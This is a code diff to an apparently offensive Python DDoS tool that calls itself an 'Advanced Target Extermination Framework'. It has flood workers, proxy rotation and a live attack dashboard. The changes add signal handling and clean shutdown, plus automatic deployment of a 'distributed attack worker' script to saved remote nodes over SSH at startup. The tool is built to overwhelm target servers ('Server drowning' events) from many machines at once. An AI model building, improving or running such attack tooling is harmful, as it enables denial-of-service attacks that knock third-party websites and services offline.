@@ -8,18 +8,18 @@ import os
 import sys
 import json
 import base64
+import signal
 import ssl as ssl_lib
 from datetime import datetime
 import getpass
-# ------------------------------------------------------------
-# Fix non-UTF8 terminal input (prevents UnicodeDecodeError on input())
-# ------------------------------------------------------------
+
 try:
     sys.stdin.reconfigure(encoding='utf-8', errors='replace')
     sys.stdout.reconfigure(encoding='utf-8', errors='replace')
     sys.stderr.reconfigure(encoding='utf-8', errors='replace')
 except Exception:
     pass
+
 try:
     from aiohttp_socks import ProxyConnector
     SOCKS_AVAILABLE = True
@@ -38,13 +38,40 @@ PROXY_SSL_CTX.verify_mode = ssl_lib.CERT_NONE
 
 NODES_FILE = "nodes.json"
 
+# ============================================================
+#  GLOBAL INTERRUPT FLAG (fixes Ctrl+C multi-press issue)
+# ============================================================
+_INTERRUPTED = [False]
+
+
+def _restore_terminal():
+    """Restore terminal to sane state (cursor visible, no alt screen)."""
+    try:
+        sys.stdout.write("\033[?25h")
+        sys.stdout.flush()
+    except Exception:
+        pass
+
+
+def _sigint_handler(signum, frame):
+    """Immediate Ctrl+C handler - restores terminal and raises."""
+    _INTERRUPTED[0] = True
+    _restore_terminal()
+    raise KeyboardInterrupt()
+
+
+# Install SIGINT handler
+try:
+    signal.signal(signal.SIGINT, _sigint_handler)
+except Exception:
+    pass
+
 
 # ==================================================================
 #          MINIMAL NODE WORKER SCRIPT (stdlib-only, no aiohttp)
-#          Supports SOCKS5 and HTTP CONNECT proxies
 # ==================================================================
 NODE_SCRIPT = r'''#!/usr/bin/env python3
-"""Minimal distributed attack worker - stdlib only, no external deps."""
+"""Minimal distributed attack worker - stdlib only."""
 import asyncio, ssl, random, string, sys, json, time, os, signal, base64
 import socket as _socket, ipaddress as _ipaddress
 from urllib.parse import urlparse
@@ -474,8 +501,6 @@ def random_string(length=12):
 #                    LIVE ATTACK DASHBOARD
 # ==================================================================
 class LiveDashboard:
-    """In-place re-rendering dashboard — no flicker, no scroll, no clear."""
-
     _THROTTLE_SEC = 3
 
     def __init__(self):
@@ -599,27 +624,23 @@ class LiveDashboard:
             return f"{Colors.MAGENTA}● PROXY{Colors.RESET}"
         return f"{Colors.RED}● {status_type}{Colors.RESET}"
 
-    
     def render(self, force=False):
         now = time.time()
         if not force and (now - self.last_render) < 0.5:
             return
         self.last_render = now
 
-        # lock: prevent overlapping renders
         if getattr(self, "_rendering", False):
             return
         self._rendering = True
 
         try:
             lines = []
-
             lines.append("")
             lines.append(f"  {Colors.BOLD}{Colors.CYAN}● LIVE ATTACK DASHBOARD{Colors.RESET}")
             lines.append(f"  {Colors.DIM}{'─' * 76}{Colors.RESET}")
             lines.append("")
 
-            # ATTACK STATUS
             elapsed = now - self.start_time
             remaining = max(0, self.duration - elapsed)
             elapsed_str = f"{int(elapsed // 60):02d}:{int(elapsed % 60):02d}"
@@ -659,7 +680,6 @@ class LiveDashboard:
             )
             lines.append("")
 
-            # NODE CLUSTER
             if self.nodes:
                 attacking = sum(
                     1 for n in self.nodes
@@ -694,7 +714,6 @@ class LiveDashboard:
                     )
                 lines.append("")
 
-            # PROXY POOL
             try:
                 proxy_sessions = list(PROXY_MANAGER.sessions.keys())
             except Exception:
@@ -734,7 +753,6 @@ class LiveDashboard:
                     )
                 lines.append("")
 
-            # LIVE EVENTS
             if self.events:
                 lines.append(f"  {Colors.BOLD}● LIVE EVENTS{Colors.RESET}")
                 event_items = sorted(self.events.items())
@@ -748,7 +766,6 @@ class LiveDashboard:
                     )
                 lines.append("")
 
-            # RECENT ACTIVITY
             if self.recent_logs:
                 lines.append(f"  {Colors.BOLD}● RECENT ACTIVITY{Colors.RESET}")
                 for status_type, msg, ts in self.recent_logs:
@@ -761,39 +778,30 @@ class LiveDashboard:
                          f"{time.strftime('%H:%M:%S')}{Colors.RESET}")
             lines.append("")
 
-            # ============================================================
-            #  RENDER using SAVE/RESTORE cursor — bulletproof method
-            # ============================================================
             buf = []
 
             if self._first_render:
-                # First frame: write everything + save cursor at TOP
-                buf.append("\033[?25l")     # hide cursor
-                buf.append("\033[2J\033[H")  # clear screen + home
+                buf.append("\033[?25l")
+                buf.append("\033[2J\033[H")
                 for line in lines:
                     buf.append(line)
                     buf.append("\033[K")
                     buf.append("\n")
-                # Save cursor position at the TOP of our block
-                buf.append(f"\033[{len(lines)}A")  # up
-                buf.append("\033[s")               # save cursor here
+                buf.append(f"\033[{len(lines)}A")
+                buf.append("\033[s")
                 self._first_render = False
             else:
-                # Restore cursor to the saved top position
                 buf.append("\033[u")
-                # Write each line with clear-to-end
                 for i, line in enumerate(lines):
                     buf.append(line)
                     buf.append("\033[K")
                     if i < len(lines) - 1:
                         buf.append("\n")
-                # If new frame is SHORTER than the previous, clean leftover
                 if len(lines) < self._prev_line_count:
                     leftover = self._prev_line_count - len(lines)
                     for _ in range(leftover):
                         buf.append("\n\033[K")
                     buf.append(f"\033[{leftover}A")
-                # Save cursor again at the top
                 buf.append(f"\033[{len(lines)-1}A")
                 buf.append("\033[s")
 
@@ -1610,7 +1618,6 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
             duration=duration,
             stats=stats,
         )
-        # Hide cursor during attack for cleaner render
         sys.stdout.write("\033[?25l")
         sys.stdout.flush()
 
@@ -1681,33 +1688,67 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                     LIVE_DASHBOARD.add_workers_spawned(add_count)
                     current_workers = new_workers
         finally:
-            if monitor_task:
+            # ========================================================
+            #  CLEAN SHUTDOWN (fixes Ctrl+C multi-press issue)
+            # ========================================================
+            LIVE_DASHBOARD.enabled = False
+
+            # Cancel dashboard immediately so it stops redrawing
+            if dashboard_task and not dashboard_task.done():
+                dashboard_task.cancel()
+
+            # Cancel all workers
+            for t in tasks:
+                if not t.done():
+                    t.cancel()
+
+            # Cancel monitors
+            if monitor_task and not monitor_task.done():
                 monitor_task.cancel()
-                try:
-                    await monitor_task
-                except asyncio.CancelledError:
-                    pass
+
+            # Cancel proxy reviver
+            try:
+                await PROXY_MANAGER.stop_reviver()
+            except Exception:
+                pass
+
+            # Close probe session
             if probe_session:
                 try:
-                    await probe_session.close()
+                    await asyncio.wait_for(probe_session.close(), timeout=2)
                 except Exception:
                     pass
 
-            await asyncio.gather(*tasks, return_exceptions=True)
-
+            # Close proxy sessions
             if PROXY_MANAGER.sessions:
-                await PROXY_MANAGER.close_all()
-            await PROXY_MANAGER.stop_reviver()
+                try:
+                    await asyncio.wait_for(PROXY_MANAGER.close_all(), timeout=2)
+                except Exception:
+                    pass
 
-            dashboard_task.cancel()
+            # Wait for tasks to actually finish - with SHORT timeout
+            gather_list = [t for t in tasks if not t.done()]
+            if monitor_task and not monitor_task.done():
+                gather_list.append(monitor_task)
+            if dashboard_task and not dashboard_task.done():
+                gather_list.append(dashboard_task)
+
+            if gather_list:
+                try:
+                    await asyncio.wait_for(
+                        asyncio.gather(*gather_list, return_exceptions=True),
+                        timeout=3
+                    )
+                except (asyncio.TimeoutError, Exception):
+                    pass
+
+            # Restore terminal
+            _restore_terminal()
             try:
-                await dashboard_task
-            except asyncio.CancelledError:
+                sys.stdout.write("\033[H\033[J")
+                sys.stdout.flush()
+            except Exception:
                 pass
-            LIVE_DASHBOARD.enabled = False
-            # Show cursor again + full clear
-            sys.stdout.write("\033[?25h\033[H\033[J")
-            sys.stdout.flush()
 
     total_time = time.time() - start_time
     rps = stats["requests"] / total_time if total_time > 0 else 0
@@ -1724,6 +1765,8 @@ async def stress_worker(direct_session, target_url, duration, stats,
                         use_proxy=False, safe_state=None):
     start_time = time.time()
     while time.time() - start_time < duration:
+        if _INTERRUPTED[0]:
+            break
         if safe_state is not None and safe_state.enabled and safe_state.active:
             await asyncio.sleep(1)
             continue
@@ -1806,6 +1849,8 @@ async def stress_worker(direct_session, target_url, duration, stats,
             stats["timeouts"] += 1
             if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
             log_event("TIMEOUT", f"Server drowning, timeout!{tag}")
+        except asyncio.CancelledError:
+            raise
         except Exception as e:
             stats["dropped"] += 1
             if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
@@ -2210,6 +2255,65 @@ async def node_management_menu():
 
 
 # ==================================================================
+#  AUTO-DEPLOY SAVED NODES AT STARTUP (NEW)
+# ==================================================================
+async def auto_deploy_saved_nodes():
+    """Auto-deploy previously saved nodes before showing main menu."""
+    if not NODE_MANAGER.nodes:
+        return
+
+    clear_screen()
+    print(f"""
+{Colors.CYAN}{Colors.BOLD}
+  ██╗   ██╗██████╗ ██╗          █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
+  ██║   ██║██╔══██╗██║         ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
+  ██║   ██║██████╔╝██║         ███████║   ██║      ██║   ███████║██║     █████╔╝ 
+  ██║   ██║██╔══██╗██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
+  ╚██████╔╝██║  ██║███████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
+   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+{Colors.RESET}{Colors.BOLD}{Colors.MAGENTA}                  [ PANEL/SUB URL ATTACK ]
+{Colors.DIM}                  Advanced Target Extermination Framework{Colors.RESET}
+""")
+
+    print(f"  {Colors.BOLD}{Colors.MAGENTA}● AUTO-DEPLOY SAVED NODES{Colors.RESET}")
+    print(f"  {Colors.DIM}{'─' * 76}{Colors.RESET}\n")
+    print(f"  {Colors.CYAN}➜ Found {Colors.BOLD}{len(NODE_MANAGER.nodes)}{Colors.RESET}"
+          f"{Colors.CYAN} saved node(s) in {Colors.BOLD}{NODES_FILE}{Colors.RESET}")
+    print(f"  {Colors.CYAN}➜ Auto-deploying before showing menu...{Colors.RESET}\n")
+
+    for n in NODE_MANAGER.nodes:
+        print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}")
+
+        # Reconnect if needed
+        if not n.client:
+            print(f"    {Colors.CYAN}➜ Connecting...{Colors.RESET}")
+            if not await NODE_MANAGER.connect(n):
+                print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}\n")
+                continue
+            print(f"    {Colors.GREEN}✓ Connected{Colors.RESET}")
+
+        # Deploy
+        print(f"    {Colors.CYAN}➜ Deploying node script...{Colors.RESET}")
+        if await NODE_MANAGER.deploy(n):
+            print(f"    {Colors.GREEN}✓ Ready{Colors.RESET}\n")
+        else:
+            print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}\n")
+
+    ready = sum(1 for n in NODE_MANAGER.nodes if n.status == "ready")
+    errored = sum(1 for n in NODE_MANAGER.nodes if n.status == "error")
+    print(f"  {Colors.BOLD}● RESULT{Colors.RESET}")
+    print(f"  {Colors.DIM}├─{Colors.RESET} Ready    {Colors.GREEN}{ready}{Colors.RESET} / {len(NODE_MANAGER.nodes)}")
+    print(f"  {Colors.DIM}└─{Colors.RESET} Errors   {Colors.RED}{errored}{Colors.RESET} / {len(NODE_MANAGER.nodes)}")
+    print()
+    print(f"  {Colors.DIM}Press Enter to continue to main menu...{Colors.RESET}")
+
+    try:
+        input()
+    except (KeyboardInterrupt, EOFError):
+        pass
+
+
+# ==================================================================
 #                    DISTRIBUTED ATTACK ORCHESTRATOR
 # ==================================================================
 async def run_distributed_attack(target_url, concurrency, duration,
@@ -2414,7 +2518,22 @@ def get_positive_int(prompt, default):
 def main_menu():
     raise_fd_limit()
 
+    # ============================================================
+    #  AUTO-DEPLOY SAVED NODES BEFORE MAIN MENU
+    # ============================================================
+    if NODE_MANAGER.nodes and PARAMIKO_AVAILABLE:
+        try:
+            asyncio.run(auto_deploy_saved_nodes())
+        except KeyboardInterrupt:
+            _restore_terminal()
+            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Auto-deploy skipped")
+            time.sleep(0.5)
+        except Exception as e:
+            print(f"\n  {Colors.RED}⚠{Colors.RESET} Auto-deploy error: {e}")
+            time.sleep(1)
+
     while True:
+        _INTERRUPTED[0] = False
         print_banner()
         ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
         print(f"  {Colors.BOLD}● SELECT ATTACK MODULE{Colors.RESET}\n")
@@ -2440,7 +2559,11 @@ def main_menu():
         print()
         print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
 
-        choice = input(f"\n  {Colors.BOLD}➜ Choose module [1]: {Colors.RESET}").strip() or "1"
+        try:
+            choice = input(f"\n  {Colors.BOLD}➜ Choose module [1]: {Colors.RESET}").strip() or "1"
+        except (KeyboardInterrupt, EOFError):
+            print(f"\n{Colors.DIM}Process canceled.{Colors.RESET}")
+            sys.exit(0)
 
         if choice == "0":
             sys.exit(0)
@@ -2448,13 +2571,15 @@ def main_menu():
             try:
                 asyncio.run(proxy_management_menu())
             except KeyboardInterrupt:
-                pass
+                _restore_terminal()
+                continue
             continue
         elif choice == "3":
             try:
                 asyncio.run(node_management_menu())
             except KeyboardInterrupt:
-                pass
+                _restore_terminal()
+                continue
             continue
         elif choice != "1":
             print(f"  {Colors.RED}⚠ Invalid choice{Colors.RESET}")
@@ -2462,37 +2587,42 @@ def main_menu():
             continue
 
         print(f"\n  {Colors.BOLD}● TARGET CONFIGURATION{Colors.RESET}\n")
-        target_url = get_target_url()
-        concurrency = get_positive_int(
-            f"  {Colors.BOLD}➜ Initial Workers [{Colors.GREEN}200{Colors.RESET}]: ", 200)
-        duration = get_positive_int(
-            f"  {Colors.BOLD}➜ Attack Duration (seconds) [{Colors.GREEN}600{Colors.RESET}]: ", 600)
+        try:
+            target_url = get_target_url()
+            concurrency = get_positive_int(
+                f"  {Colors.BOLD}➜ Initial Workers [{Colors.GREEN}200{Colors.RESET}]: ", 200)
+            duration = get_positive_int(
+                f"  {Colors.BOLD}➜ Attack Duration (seconds) [{Colors.GREEN}600{Colors.RESET}]: ", 600)
 
-        ans_safe = input(f"  {Colors.BOLD}➜ Enable Safe Mode? "
-                         f"{Colors.DIM}(pause on origin errors, auto-resume){Colors.RESET} "
-                         f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
-        safe_mode = ans_safe == "y"
+            ans_safe = input(f"  {Colors.BOLD}➜ Enable Safe Mode? "
+                             f"{Colors.DIM}(pause on origin errors, auto-resume){Colors.RESET} "
+                             f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
+            safe_mode = ans_safe == "y"
 
-        use_proxy = False
-        if PROXY_MANAGER.working_proxies:
-            ans = input(f"  {Colors.BOLD}➜ Use proxy rotation? "
-                        f"({Colors.GREEN}{len(PROXY_MANAGER.working_proxies)} available{Colors.RESET}) "
-                        f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
-            use_proxy = ans == "y"
-        else:
-            print(f"  {Colors.DIM}● No working proxies loaded — direct mode{Colors.RESET}")
+            use_proxy = False
+            if PROXY_MANAGER.working_proxies:
+                ans = input(f"  {Colors.BOLD}➜ Use proxy rotation? "
+                            f"({Colors.GREEN}{len(PROXY_MANAGER.working_proxies)} available{Colors.RESET}) "
+                            f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
+                use_proxy = ans == "y"
+            else:
+                print(f"  {Colors.DIM}● No working proxies loaded — direct mode{Colors.RESET}")
 
-        ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
-        use_nodes = False
-        if ready_nodes:
-            total_workers = concurrency * (1 + len(ready_nodes))
-            print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● NODE CLUSTER AVAILABLE{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Ready nodes      {Colors.BOLD}{len(ready_nodes)}{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Workers per node {Colors.BOLD}{concurrency}{Colors.RESET}")
-            print(f"  {Colors.DIM}└─{Colors.RESET} Total workers    {Colors.BOLD}{Colors.GREEN}{total_workers}{Colors.RESET}")
-            ans = input(f"\n  {Colors.BOLD}➜ Distribute attack across {len(ready_nodes)} node(s)? "
-                        f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
-            use_nodes = ans == "y"
+            ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
+            use_nodes = False
+            if ready_nodes:
+                total_workers = concurrency * (1 + len(ready_nodes))
+                print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● NODE CLUSTER AVAILABLE{Colors.RESET}")
+                print(f"  {Colors.DIM}├─{Colors.RESET} Ready nodes      {Colors.BOLD}{len(ready_nodes)}{Colors.RESET}")
+                print(f"  {Colors.DIM}├─{Colors.RESET} Workers per node {Colors.BOLD}{concurrency}{Colors.RESET}")
+                print(f"  {Colors.DIM}└─{Colors.RESET} Total workers    {Colors.BOLD}{Colors.GREEN}{total_workers}{Colors.RESET}")
+                ans = input(f"\n  {Colors.BOLD}➜ Distribute attack across {len(ready_nodes)} node(s)? "
+                            f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
+                use_nodes = ans == "y"
+        except (KeyboardInterrupt, EOFError):
+            _restore_terminal()
+            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Configuration canceled — returning to menu")
+            continue
 
         try:
             if use_nodes:
@@ -2503,6 +2633,7 @@ def main_menu():
                 asyncio.run(run_benchmark(target_url, concurrency, duration,
                                           use_proxy, safe_mode=safe_mode))
         except KeyboardInterrupt:
+            _restore_terminal()
             print(f"\n\n  {Colors.YELLOW}⚠{Colors.RESET} Attack aborted.")
             if use_nodes and ready_nodes:
                 print(f"  {Colors.CYAN}➜ Fallback: stopping nodes...{Colors.RESET}")
@@ -2511,12 +2642,21 @@ def main_menu():
                     print(f"  {Colors.GREEN}✓{Colors.RESET} Stop signal sent")
                 except Exception:
                     pass
+            # IMPORTANT: do NOT call input() here — go straight back to menu
+            time.sleep(0.5)
+            continue
 
-        input(f"\n  {Colors.DIM}Press Enter to return to menu...{Colors.RESET}")
+        # Normal completion - show prompt
+        try:
+            input(f"\n  {Colors.DIM}Press Enter to return to menu...{Colors.RESET}")
+        except (KeyboardInterrupt, EOFError):
+            _restore_terminal()
+            continue
 
 
 if __name__ == "__main__":
     try:
         main_menu()
     except KeyboardInterrupt:
-        print("\nProcess canceled.")
+        _restore_terminal()
+        print(f"\n{Colors.DIM}Process canceled.{Colors.RESET}")
